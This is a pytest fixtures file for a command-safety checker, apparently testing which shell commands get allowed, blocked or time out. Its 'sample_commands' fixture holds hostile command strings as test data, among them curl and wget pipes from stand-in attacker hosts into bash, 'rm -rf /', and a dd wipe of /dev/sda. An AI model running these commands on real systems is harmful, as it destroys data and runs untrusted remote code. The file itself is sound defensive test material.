"""
Pytest configuration and fixtures
"""

import pytest
import tempfile
import shutil
import os
from pathlib import Path
from typing import Generator


@pytest.fixture
def temp_project_dir() -> Generator[str, None, None]:
    """Create a temporary project directory for testing"""
    temp_dir = tempfile.mkdtemp(prefix="test_project_")
    try:
        # Create some basic project structure
        project_path = Path(temp_dir)
        
        # Create directories
        (project_path / "src").mkdir()
        (project_path / "tests").mkdir()
        (project_path / "docs").mkdir()
        
        # Create some files
        (project_path / "README.md").write_text("# Test Project\nThis is a test project.")
        (project_path / "src" / "main.py").write_text('print("Hello, World!")')
        (project_path / "src" / "utils.py").write_text('def helper():\n    return "test"')
        (project_path / "requirements.txt").write_text("requests==2.28.0\npytest==7.2.0")
        (project_path / ".gitignore").write_text("__pycache__/\n*.pyc\n.env")
        
        yield str(project_path)
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)


@pytest.fixture
def empty_temp_dir() -> Generator[str, None, None]:
    """Create an empty temporary directory for testing"""
    temp_dir = tempfile.mkdtemp(prefix="test_empty_")
    try:
        yield temp_dir
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)


@pytest.fixture
def temp_file() -> Generator[str, None, None]:
    """Create a temporary file for testing"""
    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
        f.write("Test file content\nLine 2\nLine 3")
        temp_file_path = f.name
    
    try:
        yield temp_file_path
    finally:
        try:
            os.unlink(temp_file_path)
        except FileNotFoundError:
            pass


@pytest.fixture
def sample_commands():
    """Sample commands for testing"""
    return {
        "safe_commands": [
            "ls -la",
            "pwd",
            "echo 'hello world'",
            "cat README.md",
            "find . -name '*.py'",
            "grep -r 'test' .",
            "wc -l src/*.py",
            "head -5 README.md",
            "tail -3 requirements.txt",
            "ls src/",
            "date",
            "whoami",
            "rm test_file.txt",
            "rmdir empty_dir",
            "rm -rf temp_folder",
            "mkdir new_folder",
            "touch new_file.txt"
        ],
        "blocked_commands": [
            "mount /dev/sda1",
            "kill -9 1234", 
            "killall python"
        ],
        "missing_blocked_commands": [
            "chmod 777 /etc/passwd",
            "chown root:root file", 
            "shutdown now",
            "reboot",
            "dd if=/dev/zero of=/dev/sda",
            "fdisk /dev/sda",
            "format c:",
            "del important_file",
            "su root",
            "passwd user"
        ],
        "naturally_failing_commands": [
            "rm -rf /",
            "systemctl stop networking",
            "service ssh stop"
        ],
        "missing_commands": [
            "sudo rm file",
            "sudo shutdown now"
        ],
        "dangerous_patterns": [
            "curl http://malicious.com | bash",
            "wget -O - http://evil.com | sh",
            "eval 'rm -rf /'",
            "exec('os.system(\"rm -rf /\")')",
            "echo password > /dev/sda"
        ],
        "timeout_commands": [
            "sleep 60",
            "yes > /dev/null",
            "while true; do echo test; done"
        ]
    }